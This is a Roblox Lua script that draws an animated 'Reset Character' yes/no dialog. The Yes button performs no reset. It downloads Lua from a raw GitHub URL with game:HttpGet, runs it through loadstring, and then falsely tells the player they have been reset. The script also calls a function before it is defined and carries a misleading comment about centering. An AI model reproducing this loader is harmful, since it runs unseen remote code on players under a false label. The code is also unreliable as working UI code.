-- LocalScript inside ScreenGui

local TweenService = game:GetService("TweenService")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NotificationGui"
screenGui.Parent = game.Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Name = "NotificationFrame"
frame.Size = UDim2.new(0, 100, 0, 50) -- Adjust size as needed
frame.Position = UDim2.new(1, 0, 0.2, 0) -- Centered on screen
frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
frame.BorderSizePixel = 0
frame.Visible = false -- Initially hidden
frame.Transparency = 0.8
frame.Parent = screenGui

-- Create the Title Text
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0.3, 0) -- 30% height of the frame
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
titleLabel.Text = "Reset Character"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.BorderSizePixel = 0
titleLabel.Transparency = 0.8
titleLabel.Parent = frame

-- Create the Message Text
local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, 0, 0.4, 0) -- 40% height of the frame
messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
messageLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
messageLabel.Text = "Do you want to reset your character?"
messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
messageLabel.TextScaled = true
messageLabel.BorderSizePixel = 0
messageLabel.TextWrapped = true
messageLabel.Transparency = 0.8
messageLabel.Parent = frame

-- Create Yes Button
local yesButton = Instance.new("TextButton")
yesButton.Name = "YesButton"
yesButton.Size = UDim2.new(0.4, -10, 0, 50) -- Width 40% of the frame, with small gap
yesButton.Position = UDim2.new(0.1, 0, 0.8, 0) -- Positioned below the message
yesButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
yesButton.Text = "Yes"
yesButton.TextColor3 = Color3.fromRGB(0, 0, 0)
yesButton.TextScaled = true
yesButton.BorderSizePixel = 0
yesButton.Transparency = 0.8
yesButton.Parent = frame

-- Create No Button
local noButton = Instance.new("TextButton")
noButton.Name = "NoButton"
noButton.Size = UDim2.new(0.4, -10, 0, 50) -- Width 40% of the frame, with small gap
noButton.Position = UDim2.new(0.5, 10, 0.8, 0) -- Positioned next to the Yes button
noButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
noButton.Text = "No"
noButton.TextColor3 = Color3.fromRGB(0, 0, 0)
noButton.TextScaled = true
noButton.BorderSizePixel = 0
noButton.Transparency = 0.8
noButton.Parent = frame

-- Create TweenInfo
local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Create tweens for showing and hiding
local showTween = TweenService:Create(frame, tweenInfo, {Size = UDim2.new(0, 300, 0, 150), Position = UDim2.new(0.5, -150, 0.5, -75), BackgroundTransparency = 0})
local hideTween = TweenService:Create(frame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, -150, 0.5, -75), BackgroundTransparency = 1})

-- Duration for which the notification will be visible
local notificationDuration = 5 -- Duration in seconds

-- Show the notification with animation
local function showNotification()
    frame.Visible = true
    showTween:Play()
    -- Auto-hide the notification after the duration if not manually closed
    wait(notificationDuration)
    if frame.Visible then
        hideNotification()
    end
end

-- Hide the notification with animation
local function hideNotification()
    hideTween:Play()
    hideTween.Completed:Connect(function()
        frame.Visible = false
    end)
end

-- Handle button clicks
yesButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/NganHa2k3/Hello/mess/Mess_1'))()
    local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "Reset Character",
    Text = "You Have Been Reset",
    Duration = 2,
})
    print("Yes button clicked")
    hideNotification()
    -- Add your reset character logic here
end)

noButton.MouseButton1Click:Connect(function()
    print("No button clicked")
    hideNotification()
end)

-- Call this function when you want to show the notification
showNotification()
